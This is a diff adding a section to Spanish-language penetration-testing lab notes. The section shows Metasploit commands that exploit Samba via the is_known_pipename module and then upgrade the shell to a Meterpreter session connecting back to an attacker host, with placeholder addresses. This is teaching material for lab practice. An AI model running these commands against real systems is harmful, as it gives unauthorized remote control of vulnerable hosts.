@@ -14,4 +14,20 @@ El impacto potencial incluía:
 
 ### Explotación con MSF
 
+```bash
+msf > use exploit/linux/samba/is_known_pipename
+[*] No payload configured, defaulting to cmd/unix/interact
+msf exploit(linux/samba/is_known_pipename) > set rhosts ip
+msf exploit(linux/samba/is_known_pipename) > run
+```
+
+Para elevar la sesión a meterpreter podemos hacerlo de la misma forma que en vsftpd:
+
+```bash
+msf > use post/multi/manage/shell_to_meterpreter
+msf post(multi/manage/shell_to_meterpreter) > set lhost ip_kali
+msf post(multi/manage/shell_to_meterpreter) > set session id_bash
+msf post(multi/manage/shell_to_meterpreter) > run
+```
+
 [⟵ Anterior](../05_sistema.md#explotación-windows)
